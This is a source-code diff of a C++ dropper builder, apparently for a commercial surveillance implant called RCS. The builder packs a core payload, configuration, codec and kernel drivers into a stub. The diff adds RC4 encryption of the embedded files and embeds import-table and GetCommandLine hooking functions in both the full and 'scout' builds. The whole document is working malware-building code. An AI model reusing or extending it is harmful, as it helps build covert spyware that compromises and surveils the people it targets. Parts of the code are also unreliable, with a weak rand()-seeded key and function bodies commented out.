@@ -9,7 +9,7 @@ namespace bf = boost::filesystem;
 
 #include <aplib.h>
 
-#include "DropperCode.h"
+#include "../../RCSDropper/DropperCode.h"
 #include "Components.h"
 #include "RCSPayload.h"
 #include "RCSConfig.h"
@@ -34,7 +34,7 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 		cout << "Driver (64bit) : " << (rcs_.driver64().empty() ? "none" : rcs_.driver64()) << endl;
 		cout << "Codec          : " << rcs_.codec() << endl;
 		cout << "Install dir    : " << rcs_.directory() << endl;
-		cout << "Manifest       : " << ( rcs_.manifest() ? "true" : "false" ) << endl;
+		cout << "Manifest       : " << (rcs_.manifest() ? "true" : "false" ) << endl;
 		cout << "Installer		: " << (rcs_.installer() ? "true" : "false" ) << endl;
 
 		cout << endl;
@@ -49,7 +49,7 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 		cout << endl;
 
 		unsigned int buffer_size = 
-			alignToDWORD( sizeof(DropperHeader) )
+			alignToDWORD( sizeof(DataSectionHeader) )
 			+ rcs_.core_size()
 			+ rcs_.core64_size()
 			+ rcs_.config_size()
@@ -64,74 +64,79 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 		cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;
 
 		// HEADER
-		DropperHeader* header = (DropperHeader*) ptr;
-		memset(header, 0, sizeof(DropperHeader));
-		ptr += sizeof(DropperHeader);
+		DataSectionHeader* header = (DataSectionHeader*) ptr;
+		memset(header, 0, sizeof(DataSectionHeader));
+		header->isScout = 0;
+
+		// RC4 key
+		PBYTE encryptionKey = (PBYTE)malloc(32);
+		srand(time(NULL));
+		for (ULONG i=0; i<64; i++)
+			header->rc4key[i] = rand();
+
+
+		ptr += sizeof(DataSectionHeader);
 		cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;
 
-		// HEADER -> cooker version
-		memcpy(&header->version, productVersion.c_str(), productVersion.length() + 1);
-
+		
 		// MARKER
-		DWORD offset = sizeof(DropperHeader);
-		header->offsetToHeader = offset;
+		DWORD offset = sizeof(DataSectionHeader);
+		cout << "Sizeof DataSectionHeader: " << hex << offset << endl;
+		memcpy(ptr, &offset, sizeof(offset));
+		ptr += sizeof(offset);
+		END_MARKER(ptr);
 
-		END_MARKER(&header->headerEndMarker);
+		// HEADER -> cooker version
+		cout << "VERSION => " << productVersion.c_str() << endl;
+		memcpy(header->version, productVersion.c_str(), productVersion.length() + 1);
+		cout << "INSTDIR => " << rcs_.directory().c_str() << endl;
+		memcpy(header->instDir, rcs_.directory().c_str(), strlen(rcs_.directory().c_str()));
+		cout << "EXPORTS => " << rcs_.func().c_str() << endl;
+		memcpy(header->eliteExports, rcs_.func().c_str(), 21);
+
+		//header->offsetToHeader = offset;
+		//END_MARKER(&header->headerEndMarker);
 
 		// DROPPER CODE
 
 		// entry point must always be the first function copied
 		if (!rcs_.installer())
 		{
-			ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr);
+			ptr += embedFunction_(components.entryPoint(), header->functions.newEntryPoint, ptr);
+			//END_MARKER(ptr);
 			ptr += embedFunction_(components.coreThread(), header->functions.coreThread, ptr);
 			ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr);
-			OFFSET(ptr);
-			END_MARKER_AND_INCREMENT_PTR(ptr);
-			ptr += embedFunction_(components.hookCall(), header->functions.hookCall, ptr);
-			OFFSET(ptr);
-			END_MARKER_AND_INCREMENT_PTR(ptr);
+			ptr += embedFunction_(components.hookIAT(), header->functions.hookIAT, ptr);
 			ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
-			OFFSET(ptr);
-			END_MARKER_AND_INCREMENT_PTR(ptr);
-			ptr += embedFunction_(components.exit(), header->functions.exitHook, ptr);
 			ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
+			ptr += embedFunction_(components.getCommandLineAHook(), header->functions.GetCommandLineAHook, ptr);
+			ptr += embedFunction_(components.getCommandLineWHook(), header->functions.GetCommandLineWHook, ptr);
 		}
 
 		// RCS FILES
 
-		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr );
-		ptr += embedFile_(rcs.config(), header->files.names.config, header->files.config, ptr );
+		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr, header->rc4key);
+		ptr += embedFile_(rcs.config(), header->files.names.config, header->files.config, ptr, header->rc4key);
 		if ( rcs_.core64_size() ) {
-			ptr += embedFile_(rcs.core64(), header->files.names.core64, header->files.core64, ptr );
+			ptr += embedFile_(rcs.core64(), header->files.names.core64, header->files.core64, ptr, header->rc4key);
 		}
 		if ( rcs_.codec_size() ) {
-			ptr += embedFile_(rcs.codec(), header->files.names.codec, header->files.codec, ptr );
+			ptr += embedFile_(rcs.codec(), header->files.names.codec, header->files.codec, ptr, header->rc4key);
 		}
 
 		if ( rcs_.driver_size() ) 
 		{
 			if ( rcs_.driver().filename() != string("none"))
 				//if ( strcmp(rcs_.driver().filename().com .c_str(), "null") )
-				ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr );
+				ptr += embedFile_(rcs.driver(), header->files.names.driver, header->files.driver, ptr, header->rc4key);
 		}
 
 
 		if (rcs_.driver64_size() ) 
 		{
 			if ( rcs_.driver64().filename() != string("none"))
-				//if ( strcmp(rcs_.driver64().filename().c_str(), "null") )
-				ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr );
+				ptr += embedFile_(rcs.driver64(), header->files.names.driver64, header->files.driver64, ptr, header->rc4key);
 		}
-
-
-		// DLL CALLS
-
-		ptr += embedDllCalls_(header, ptr);
-
-		// STRINGS
-
-		ptr += embedStrings_(rcs, header, ptr);
 
 		cookedSize_ = ptr - cooked_.get();
 		cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
@@ -140,7 +145,7 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 	{
 		cout << "Building dropper stub for scout" << endl;
 		unsigned int buffer_size = 
-			alignToDWORD( sizeof(DropperHeader) )
+			alignToDWORD( sizeof(DataSectionHeader) )
 			+ rcs_.core_size()
 			+ 69535; // account for strings, etc.
 
@@ -149,35 +154,39 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 		cout << __FUNCTION__ << " BASE ptr: 0x" << hex << (DWORD)ptr << endl;
 
 		// HEADER
-		DropperHeader* header = (DropperHeader*) ptr;
-		memset(header, 0, sizeof(DropperHeader));
-		ptr += sizeof(DropperHeader);
+		DataSectionHeader* header = (DataSectionHeader*) ptr;
+		memset(header, 0, sizeof(DataSectionHeader));
+		header->isScout = 1; // SCOUT
+
+		// RC4 key
+		PBYTE encryptionKey = (PBYTE)malloc(32);
+		srand(time(NULL));
+		for (ULONG i=0; i<64; i++)
+			header->rc4key[i] = rand();
+
+		ptr += sizeof(DataSectionHeader);
 		cout << __FUNCTION__ << " HEADER ptr: 0x" << hex << (DWORD)ptr << endl;
-		cout << __FUNCTION__ << " HEADER size: 0x" << hex << sizeof(DropperHeader) << endl;
+		cout << __FUNCTION__ << " HEADER size: 0x" << hex << sizeof(DataSectionHeader) << endl;
 
 		// HEADER -> cooker version
-		memcpy(&header->version, productVersion.c_str(), productVersion.length() + 1);
+		memcpy(header->version, productVersion.c_str(), productVersion.length() + 1);
 
-		// MARKER
-		DWORD offset = sizeof(DropperHeader);
-		header->offsetToHeader = offset;
-
-		END_MARKER(&header->headerEndMarker);
-
-		ptr += embedFunction_(components.entryPoint(), header->functions.entryPoint, ptr); 
-		ptr += embedFunction_(components.dumpFile(), header->functions.dumpFile, ptr); // ExtractFile
 		OFFSET(ptr);
-		END_MARKER_AND_INCREMENT_PTR(ptr);
-		ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
+		END_MARKER(ptr);
+
+		ptr += embedFunction_(components.entryPoint(), header->functions.newEntryPoint, ptr); 
+		ptr += embedFunction_(components.hookIAT(), header->functions.hookIAT, ptr); 
 		ptr += embedFunction_(components.rc4(), header->functions.rc4, ptr);
 		ptr += embedFunction_(components.load(), header->functions.load, ptr);
+		ptr += embedFunction_(components.exitProcess(), header->functions.exitProcessHook, ptr);
+		ptr += embedFunction_(components.getCommandLineAHook(), header->functions.GetCommandLineAHook, ptr);
+		ptr += embedFunction_(components.getCommandLineWHook(), header->functions.GetCommandLineWHook, ptr);
 
-		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr);
-		//ptr += embedDllCalls_(header, ptr);
-
+		ptr += embedFile_(rcs.core(), header->files.names.core, header->files.core, ptr, header->rc4key);
 		cookedSize_ = ptr - cooked_.get();
 		cout << __FUNCTION__ << " cooked size: " << cookedSize_ << endl;
 	}
+
 }
 
 std::size_t RCSPayload::embedFunction_( const DataBuffer& source, DataSectionBlob& func, char *ptr )
@@ -205,7 +214,54 @@ int __stdcall callback(unsigned int insize, unsigned int inpos, unsigned int out
 	return 1;
 }
 
-std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
+void rc4_encrypt(
+	const unsigned char *key, 
+	size_t keylen, 
+	size_t skip,
+	unsigned char *data, 
+	size_t data_len)
+{
+	unsigned int i, j, k;
+	unsigned char *pos;
+	size_t kpos;
+		
+	unsigned char *S = (unsigned char*) malloc(256);
+	
+	/* Setup RC4 state */
+	for (i = 0; i < 256; i++)
+		S[i] = i;
+	j = 0;
+	kpos = 0;
+	for (i = 0; i < 256; i++) {
+		j = (j + S[i] + key[kpos]) & 0xff;
+		kpos++;
+		if (kpos >= keylen)
+			kpos = 0;
+		S_SWAP(i, j);
+	}
+	
+	/* Skip the start of the stream */
+	i = j = 0;
+	for (k = 0; k < skip; k++) {
+		i = (i + 1) & 0xff;
+		j = (j + S[i]) & 0xff;
+		S_SWAP(i, j);
+	}
+	
+	/* Apply RC4 to data */
+	pos = data;
+	for (k = 0; k < data_len; k++) {
+		i = (i + 1) & 0xff;
+		j = (j + S[i]) & 0xff;
+		S_SWAP(i, j);
+		*pos++ ^= S[(S[i] + S[j]) & 0xff];
+	}
+
+	free(S);
+}
+
+
+std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr, char *key)
 {
 	// TODO move to auto pointers
 
@@ -247,6 +303,8 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 		printf("Error compressing!\n");
 		return 0;
 	}
+
+	rc4_encrypt((unsigned char*)key, RC4KEYLEN, 0, (unsigned char *)packed, packed_size);
     
 	delete [] buf;
 	
@@ -258,6 +316,8 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 		workmem = NULL;
 	}
 	
+	// encrypt
+
 	// write compressed to buffer
 	memcpy(p, packed, packed_size);
 	p += packed_size;
@@ -271,8 +331,9 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 }
 
 
-std::size_t RCSPayload::embedStrings_( RCSConfig &rcs, DropperHeader* header, char* ptr )
+std::size_t RCSPayload::embedStrings_( RCSConfig &rcs, DataSectionHeader* header, char* ptr )
 {
+	/*
 	char* p = ptr;
 	
 	std::list<std::string> strings;
@@ -281,11 +342,11 @@ std::size_t RCSPayload::embedStrings_( RCSConfig &rcs, DropperHeader* header, ch
 	strings.push_back(rcs.directory());
 
 	// copy all dropper strings
-	int i = 0;
-	while (_needed_strings[i] != NULL) {
-		strings.push_back(std::string(_needed_strings[i]));
-		i++;
-	}
+//	int i = 0;
+//	while (_needed_strings[i] != NULL) {
+//		strings.push_back(std::string(_needed_strings[i]));
+//		i++;
+//	}
 	
 	// reserve space for string offsets
 	header->stringsOffsets.offset = offset_(p);
@@ -318,11 +379,14 @@ std::size_t RCSPayload::embedStrings_( RCSConfig &rcs, DropperHeader* header, ch
 	
 	std::size_t ret = ((DWORD)p - (DWORD)ptr);
 	cout << __FUNCTION__ << " size: " << ret << endl;
+	
 	return ret;
+	*/
 }
 
-std::size_t RCSPayload::embedDllCalls_( DropperHeader* header, char* ptr )
+std::size_t RCSPayload::embedDllCalls_( DataSectionHeader* header, char* ptr )
 {
+	/*
 	char* p = ptr;
 
 	// Calls
@@ -366,6 +430,7 @@ std::size_t RCSPayload::embedDllCalls_( DropperHeader* header, char* ptr )
 	std::size_t ret = ((DWORD)p - (DWORD)ptr);
 	cout << __FUNCTION__ << " size: " << ret << endl;
 	return ret;
+	*/
 }
 
 bool RCSPayload::write( bf::path file )
